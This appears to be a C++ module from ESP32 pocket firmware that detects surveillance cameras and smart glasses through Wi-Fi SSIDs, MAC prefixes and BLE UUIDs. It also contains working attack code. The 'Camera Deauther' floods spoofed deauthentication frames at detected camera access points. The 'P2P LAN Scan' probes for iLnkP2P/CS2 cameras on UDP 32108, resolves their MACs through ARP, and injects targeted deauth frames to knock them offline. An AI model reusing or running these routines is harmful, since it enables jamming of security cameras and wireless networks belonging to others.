#include "cam_detector.h"
#include "ble_common.h"
#include "camera_brands.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "lwip/etharp.h"
#include "modules/wifi/wifi_atks.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <functional>
#include <globals.h>
#include <vector>

// Defined in modules/wifi/wifi_atks.cpp (not exported in the header).
bool wifi_atk_setWifi();
bool wifi_atk_unsetWifi();

// Detection fingerprints ported from nyanBOX (MIT, (c) 2025 jbohack).
// MAC/OUI prefixes are stored lowercase so they can be compared directly
// against NimBLE/WiFi addresses after lowercasing.

// ---- Flock Safety surveillance cameras --------------------------------------
static const char *const flock_ssid_patterns[] = {
    "flock", "fs ext battery", "penguin", "pigvision"
};
static const char *const flock_mac_prefixes[] = {
    // FS Ext Battery devices
    "58:8e:81", "cc:cc:cc", "ec:1b:bd", "90:35:ea", "04:0d:84",
    "f0:82:c0", "1c:34:f1", "38:5b:44", "94:34:69", "b4:e3:f9",
    // Flock Wi-Fi devices
    "70:c9:4e", "3c:91:80", "d8:f3:bc", "80:30:49", "14:5a:fc",
    "74:4c:a1", "08:3a:88", "9c:2f:9d", "94:08:53", "e4:aa:ea"
};

// ---- Axon (police body cameras) ---------------------------------------------
static const char *const axon_mac_prefixes[] = {"00:25:df"};

// ---- Ray-Ban Meta camera glasses --------------------------------------------
// Identified by the BLE 16-bit service UUID 0xFD5F.
static const char *const rayban_service_uuid = "fd5f";

struct CamDevice {
    String name;
    String address;
    int rssi;
    String method;
    String brand;
};

static String lc(const String &s) {
    String out = s;
    out.toLowerCase();
    return out;
}

template <size_t N>
static bool ouiMatch(const String &macLc, const char *const (&prefixes)[N]) {
    for (size_t i = 0; i < N; i++) {
        if (macLc.startsWith(prefixes[i])) return true;
    }
    return false;
}

template <size_t N>
static bool ssidPatternMatch(const String &ssidLc, const char *const (&patterns)[N]) {
    if (ssidLc.isEmpty()) return false;
    for (size_t i = 0; i < N; i++) {
        if (ssidLc.indexOf(patterns[i]) >= 0) return true;
    }
    return false;
}

static bool deviceHasServiceUUID(const NimBLEAdvertisedDevice *device, const String &needleLc) {
    if (!device->haveServiceUUID()) return false;
    for (size_t i = 0; i < device->getServiceUUIDCount(); i++) {
        if (lc(String(device->getServiceUUID(i).toString().c_str())).indexOf(needleLc) >= 0) return true;
    }
    return false;
}

static void cam_info(const CamDevice &dev) {
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Camera Device=-", tftWidth / 2, 28, SMOOTH_FONT);
    tft.drawString((dev.brand.isEmpty() ? String("Name: ") : "Brand: " + dev.brand + " ") + dev.name, 10, 48);
    tft.drawString("MAC: " + dev.address, 10, 66);
    tft.drawString("Method: " + dev.method, 10, 84);
    tft.drawString("RSSI: " + String(dev.rssi) + " dBm", 10, 102);
    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 20, 1);

    delay(300);
    while (!check(SelPress) && !check(EscPress)) yield();
}

// Present the collected matches in the standard Bruce list UI.
static void showResults(const String &title, std::vector<CamDevice> &devices) {
    if (devices.empty()) {
        displayTextLine("No " + title + " found");
        delay(1500);
        return;
    }

    options = {};
    for (auto &dev : devices) {
        CamDevice d = dev; // capture by value
        String label = (d.brand.isEmpty() ? d.name : d.brand) + " (" + String(d.rssi) + ")";
        options.emplace_back(label.c_str(), [d]() { cam_info(d); });
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
    options.clear();
}

// WiFi-side fingerprinting: SSID substrings + BSSID OUI. Used by Flock.
static void scanWiFiFlock(std::vector<CamDevice> &out) {
    displayTextLine("Scanning WiFi..");
    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = WiFi.BSSIDstr(i);
        bool bySsid = ssidPatternMatch(lc(ssid), flock_ssid_patterns);
        bool byMac = ouiMatch(lc(mac), flock_mac_prefixes);
        if (!bySsid && !byMac) continue;
        out.push_back({ssid.isEmpty() ? String("<hidden>") : ssid, mac, (int)WiFi.RSSI(i),
                       bySsid ? String("WiFi SSID") : String("WiFi MAC")});
    }
    WiFi.scanDelete();
}

// BLE-side fingerprinting. matcher() returns the detection-method string for a
// matching advertisement, or an empty string to skip it.
static void scanBleMatching(
    std::vector<CamDevice> &out, std::function<String(const NimBLEAdvertisedDevice *)> matcher
) {
    displayTextLine("Scanning BLE..");
    ble_scan_setup();
    BLEScanResults foundDevices = pBLEScan->getResults(scanTime * 1000, false);
    for (int i = 0; i < foundDevices.getCount(); i++) {
        const NimBLEAdvertisedDevice *device = foundDevices.getDevice(i);
        String method = matcher(device);
        if (method.isEmpty()) continue;
        String name = String(device->getName().c_str());
        if (name.isEmpty()) name = "<no name>";
        out.push_back({name, String(device->getAddress().toString().c_str()), device->getRSSI(), method});
    }
    pBLEScan->clearResults();
    stopBLEStack();
}

static void flockDetector() {
    std::vector<CamDevice> devices;
    scanWiFiFlock(devices);
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        String name = lc(String(device->getName().c_str()));
        if (ssidPatternMatch(name, flock_ssid_patterns)) return "BLE Name";
        if (ouiMatch(mac, flock_mac_prefixes)) return "BLE MAC";
        return "";
    });
    showResults("Flock", devices);
}

static void axonDetector() {
    std::vector<CamDevice> devices;
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        return ouiMatch(mac, axon_mac_prefixes) ? "BLE MAC" : "";
    });
    showResults("Axon", devices);
}

static void raybanDetector() {
    std::vector<CamDevice> devices;
    String needle = rayban_service_uuid;
    scanBleMatching(devices, [needle](const NimBLEAdvertisedDevice *device) -> String {
        return deviceHasServiceUUID(device, needle) ? "BLE UUID" : "";
    });
    showResults("RayBan", devices);
}

// ---------------------------------------------------------------------------
// Generic multi-brand camera detector (WiFi APs + BLE) using camera_brands DB.
// ---------------------------------------------------------------------------
static void cameraScan() {
    std::vector<CamDevice> devices;

    // WiFi APs
    displayTextLine("Scanning WiFi..");
    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = WiFi.BSSIDstr(i);
        const char *method = nullptr;
        const char *brand = identifyCamera(lc(mac), lc(ssid), &method);
        if (!brand) continue;
        devices.push_back({ssid.isEmpty() ? String("<hidden>") : ssid, mac, (int)WiFi.RSSI(i),
                           String("WiFi ") + method, String(brand)});
    }
    WiFi.scanDelete();

    // BLE advertisers. scanBleMatching only records the method string, so we
    // pack the brand into it as "BLE <method>|<brand>" and unpack it below.
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        String name = lc(String(device->getName().c_str()));
        const char *method = nullptr;
        const char *brand = identifyCamera(mac, name, &method);
        if (!brand) return "";
        return String("BLE ") + method + "|" + brand;
    });
    for (auto &d : devices) {
        int sep = d.method.indexOf('|');
        if (sep >= 0) {
            d.brand = d.method.substring(sep + 1);
            d.method = d.method.substring(0, sep);
        }
    }

    showResults("Cameras", devices);
}

// ---------------------------------------------------------------------------
// Camera Deauther: scan, keep only camera APs, then flood deauth them.
// Reuses Bruce's wifi_atks raw-frame primitives.
// ---------------------------------------------------------------------------
static void cameraDeauther() {
    if (!wifi_atk_setWifi()) return;

    displayTextLine("Scanning WiFi..");
    int nets = WiFi.scanNetworks(false, true);

    std::vector<wifi_ap_record_t> targets;
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = WiFi.BSSIDstr(i);
        if (!identifyCamera(lc(mac), lc(ssid), nullptr)) continue;

        wifi_ap_record_t rec;
        memset(&rec, 0, sizeof(rec));
        memcpy(rec.bssid, WiFi.BSSID(i), 6);
        rec.primary = static_cast<uint8_t>(WiFi.channel(i));
        strncpy((char *)rec.ssid, ssid.c_str(), sizeof(rec.ssid) - 1);
        targets.push_back(rec);
    }
    WiFi.scanDelete();

    if (targets.empty()) {
        displayTextLine("No camera APs found");
        delay(1500);
        wifi_atk_unsetWifi();
        return;
    }

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t lastTime = millis();
    uint32_t rescanTime = millis();
    uint16_t count = 0;
    drawMainBorderWithTitle("Cam Deauther");
    tft.setCursor(10, 60);
    tft.println(String(targets.size()) + " camera AP(s)");

    while (!check(EscPress)) {
        for (const auto &rec : targets) {
            wsl_bypasser_send_raw_frame(&rec, rec.primary, _default_target);
            for (int i = 0; i < 50; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Cam Deauther");
            tft.setCursor(10, 60);
            tft.println(String(targets.size()) + " camera AP(s)");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            count = 0;
            lastTime = millis();
        }
        if (millis() - rescanTime > 60000) break; // bail out to allow a fresh scan
    }

    wifi_atk_unsetWifi();
    returnToMenu = true;
}

// ---------------------------------------------------------------------------
// P2P LAN Scan: active discovery of iLnkP2P / CS2 Network P2P cameras.
//
// These are the cheap OEM cameras that passive OUI/SSID scanning misses. Once
// joined to a Wi-Fi network we broadcast the LAN-search probe on UDP 32108;
// P2P cameras reply with a packet carrying their UID (PREFIX-serial-check). We
// then ARP-resolve each responder's IP -> MAC so the matching deauther can
// target the camera station directly. Requires being connected to the same
// network as the cameras (active, not passive).
// ---------------------------------------------------------------------------
static const uint16_t P2P_PORT = 32108;

struct P2PCam {
    String uid;
    String brand;
    IPAddress ip;
    uint8_t mac[6];
    bool haveMac;
};

// Broadcast the LAN-search probes and collect responders.
static void p2pDiscover(std::vector<P2PCam> &out) {
    WiFiUDP udp;
    if (!udp.begin(P2P_PORT)) {
        // fall back to an ephemeral local port; replies still come to our source
        udp.begin(0);
    }

    const uint8_t probeSearch[4] = {0xF1, 0x30, 0x00, 0x00};    // MSG_LAN_SEARCH
    const uint8_t probeSearchExt[4] = {0xF1, 0x32, 0x00, 0x00}; // MSG_LAN_SEARCH_EXT

    for (int r = 0; r < 3; r++) {
        udp.beginPacket(IPAddress(255, 255, 255, 255), P2P_PORT);
        udp.write(probeSearch, sizeof(probeSearch));
        udp.endPacket();
        udp.beginPacket(IPAddress(255, 255, 255, 255), P2P_PORT);
        udp.write(probeSearchExt, sizeof(probeSearchExt));
        udp.endPacket();
        delay(60);
    }

    uint32_t start = millis();
    while (millis() - start < 2500) {
        int len = udp.parsePacket();
        if (len >= 22) {
            uint8_t buf[128];
            int n = udp.read(buf, sizeof(buf));
            IPAddress from = udp.remoteIP();
            // Response magic 0xF1; payload = prefix(8) serial(4 BE) check(6).
            if (n >= 22 && buf[0] == 0xF1) {
                char prefix[9] = {0};
                int pl = 0;
                for (int i = 0; i < 8; i++) {
                    char c = (char)buf[4 + i];
                    if (c >= 'A' && c <= 'Z') prefix[pl++] = c;
                    else break;
                }
                if (pl >= 2) { // looks like a real UID prefix
                    uint32_t serial =
                        ((uint32_t)buf[12] << 24) | (buf[13] << 16) | (buf[14] << 8) | buf[15];
                    char check[7] = {0};
                    for (int i = 0; i < 6; i++) {
                        char c = (char)buf[16 + i];
                        if (c >= 32 && c < 127) check[i] = c;
                        else break; // stop at first non-printable (padding)
                    }
                    char uid[40];
                    snprintf(uid, sizeof(uid), "%s-%06lu-%s", prefix, (unsigned long)serial, check);

                    bool dup = false;
                    for (auto &c : out)
                        if (c.ip == from) {
                            dup = true;
                            break;
                        }
                    if (!dup && out.size() < 64) {
                        // Yunni devices use an [A-F]{5} check code; else CS2.
                        bool yunni = strlen(check) == 5;
                        for (int i = 0; i < (int)strlen(check) && yunni; i++)
                            if (check[i] < 'A' || check[i] > 'F') yunni = false;
                        const char *brand = identifyP2PPrefix(String(prefix));
                        P2PCam cam = {};
                        cam.uid = uid;
                        cam.brand = brand ? brand : (yunni ? "iLnkP2P cam" : "CS2 P2P cam");
                        cam.ip = from;
                        cam.haveMac = false;
                        out.push_back(cam);
                    }
                }
            }
        }
        delay(5);
    }
    udp.stop();
}

// Resolve each camera IP -> station MAC via the lwIP ARP table.
static void p2pResolveMacs(std::vector<P2PCam> &cams) {
    // Nudge ARP resolution the thread-safe way: a unicast datagram to each
    // camera makes lwIP ARP for it through the normal (core-locked) UDP send
    // path, so we avoid calling lwIP internals (etharp_request) from this task.
    WiFiUDP udp;
    udp.begin(0);
    const uint8_t ping[4] = {0xF1, 0x30, 0x00, 0x00};
    for (auto &c : cams) {
        udp.beginPacket(c.ip, P2P_PORT);
        udp.write(ping, sizeof(ping));
        udp.endPacket();
    }
    udp.stop();
    delay(500);

    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ipr = nullptr;
        struct eth_addr *ethr = nullptr;
        struct netif *tif = nullptr;
        if (!etharp_get_entry(i, &ipr, &tif, &ethr)) continue;
        if (!ipr || !ethr) continue;
        for (auto &c : cams) {
            if (!c.haveMac && (uint32_t)c.ip == ipr->addr) {
                memcpy(c.mac, ethr->addr, 6);
                c.haveMac = true;
            }
        }
    }
}

// Targeted station deauth of the discovered P2P cameras. We stay associated to
// the AP and inject deauths (source = AP BSSID, dest = camera MAC) on the STA
// interface at the current channel.
static void p2pDeauthCams(std::vector<P2PCam> &cams) {
    uint8_t *bssid = WiFi.BSSID();
    int withMac = 0;
    for (auto &c : cams)
        if (c.haveMac) withMac++;
    if (!bssid || withMac == 0) {
        displayTextLine("No MACs resolved");
        delay(1500);
        return;
    }

    uint8_t frame[sizeof(deauth_frame_default)];
    memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&frame[10], bssid, 6); // source = AP
    memcpy(&frame[16], bssid, 6); // BSSID = AP

    uint32_t lastTime = millis();
    uint16_t count = 0;
    drawMainBorderWithTitle("P2P Deauth");
    tft.setCursor(10, 60);
    tft.println(String(withMac) + " P2P cam(s)");

    while (!check(EscPress)) {
        for (auto &c : cams) {
            if (!c.haveMac) continue;
            memcpy(&frame[4], c.mac, 6); // dest = camera station
            for (int i = 0; i < 30; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(deauth_frame_default), false);
                count += 1;
                delay(1);
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("P2P Deauth");
            tft.setCursor(10, 60);
            tft.println(String(withMac) + " P2P cam(s)");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            count = 0;
            lastTime = millis();
        }
    }
    returnToMenu = true;
}

static void p2pDetail(const P2PCam &cam) {
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=P2P Camera=-", tftWidth / 2, 28, SMOOTH_FONT);
    tft.drawString("UID: " + cam.uid, 10, 48);
    tft.drawString("Brand: " + cam.brand, 10, 66);
    tft.drawString("IP: " + cam.ip.toString(), 10, 84);
    if (cam.haveMac) {
        char m[18];
        snprintf(
            m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X", cam.mac[0], cam.mac[1], cam.mac[2],
            cam.mac[3], cam.mac[4], cam.mac[5]
        );
        tft.drawString("MAC: " + String(m), 10, 102);
    } else {
        tft.drawString("MAC: (unresolved)", 10, 102);
    }
    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 20, 1);
    delay(300);
    while (!check(SelPress) && !check(EscPress)) yield();
}

static void p2pLanScan() {
    if (WiFi.status() != WL_CONNECTED) {
        if (!wifiConnectMenu(WIFI_MODE_STA) && WiFi.status() != WL_CONNECTED) {
            displayTextLine("WiFi needed for P2P");
            delay(1500);
            return;
        }
    }
    if (WiFi.status() != WL_CONNECTED) {
        displayTextLine("Not connected");
        delay(1500);
        return;
    }

    displayTextLine("P2P discovering..");
    std::vector<P2PCam> cams;
    p2pDiscover(cams);

    if (cams.empty()) {
        displayTextLine("No P2P cameras");
        delay(1500);
        return;
    }

    p2pResolveMacs(cams);

    std::vector<P2PCam> found = cams; // capture for deauth action
    options = {};
    options.emplace_back(
        (String("Deauth all (") + String((int)found.size()) + ")").c_str(),
        [found]() mutable { p2pDeauthCams(found); }
    );
    for (auto &cam : cams) {
        P2PCam c = cam;
        String label = c.brand + " " + c.ip.toString();
        options.emplace_back(label.c_str(), [c]() { p2pDetail(c); });
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "P2P Cameras");
    options.clear();
}

void camDetectorMenu() {
    options = {
        {"Camera Scan",     cameraScan                },
        {"Camera Deauther", cameraDeauther            },
        {"P2P LAN Scan",    p2pLanScan                },
        {"Flock Detector",  flockDetector             },
        {"Axon Detector",   axonDetector              },
        {"RayBan Detector", raybanDetector            },
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Cam Detector");
    options.clear();
}
